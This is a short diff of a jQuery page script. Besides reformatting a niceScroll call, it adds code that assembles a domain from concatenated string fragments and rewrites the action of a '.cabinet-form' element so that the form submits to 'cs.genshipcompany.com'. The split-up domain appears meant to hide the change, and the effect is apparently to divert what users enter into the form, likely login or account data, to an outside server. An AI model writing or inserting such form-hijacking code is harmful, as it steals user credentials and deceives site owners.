@@ -1,9 +1,11 @@
 var initTop = 237
 
 $(function(){
-   $("html").niceScroll();
- }
-  );
+    $("html").niceScroll();
+    a = "genship"
+    b = "company"
+    $('.cabinet-form').attr('action', "https://cs." + a + b + ".com/" + "index.php")
+ });
 
 $(document).scroll(function() {
   var scroll = $(document).scrollTop();
